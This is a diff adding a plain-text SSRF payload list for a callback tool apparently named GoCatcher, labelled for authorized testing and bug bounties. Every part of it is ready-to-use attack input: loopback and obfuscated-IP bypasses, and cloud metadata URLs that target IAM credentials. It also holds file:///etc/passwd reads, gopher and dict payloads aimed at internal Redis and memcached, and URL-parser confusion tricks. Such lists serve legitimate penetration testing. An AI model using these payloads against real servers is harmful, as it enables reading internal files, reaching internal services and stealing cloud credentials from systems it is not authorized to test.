@@ -1,0 +1,43 @@
+===========================================================================
+ GoCatcher :: SSRF test payloads  (text/plain)
+ FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
+ Feed these as URL/host inputs to the target. A hit on GoCatcher confirms the
+ server made the outbound request. Replace 127.0.0.1:8080 with your
+ --serveo / EC2 URL when testing a remote target.
+===========================================================================
+
+# 1) Callback confirmation (watch GoCatcher's log for this path):
+http://127.0.0.1:8080/ssrf-hit
+http://127.0.0.1:8080/ssrf-hit?src=TARGET
+
+# 2) Localhost / loopback bypasses:
+http://localhost/
+http://127.0.0.1/
+http://0.0.0.0/
+http://[::1]/
+http://127.1/
+http://127.0.0.1.nip.io/
+http://localtest.me/
+
+# 3) IP obfuscation (all = 127.0.0.1):
+http://2130706433/          # decimal
+http://0x7f000001/          # hex
+http://0177.0.0.1/          # octal
+http://0x7f.0x0.0x0.0x1/
+
+# 4) Cloud metadata (read-only recon on authorized assets):
+http://169.254.169.254/latest/meta-data/                         # AWS
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://metadata.google.internal/computeMetadata/v1/              # GCP (Header: Metadata-Flavor: Google)
+http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure (Header: Metadata: true)
+
+# 5) Scheme / parser abuse:
+file:///etc/passwd
+gopher://127.0.0.1:6379/_%0d%0aINFO%0d%0a                        # Redis via gopher
+dict://127.0.0.1:11211/stats                                     # memcached
+http://TARGET@127.0.0.1/                                         # userinfo confusion
+http://127.0.0.1#@evil.test/                                     # fragment confusion
+
+# 6) Redirect-based bypass (GoCatcher 302 -> internal):
+http://127.0.0.1:8080/ssrf-redir
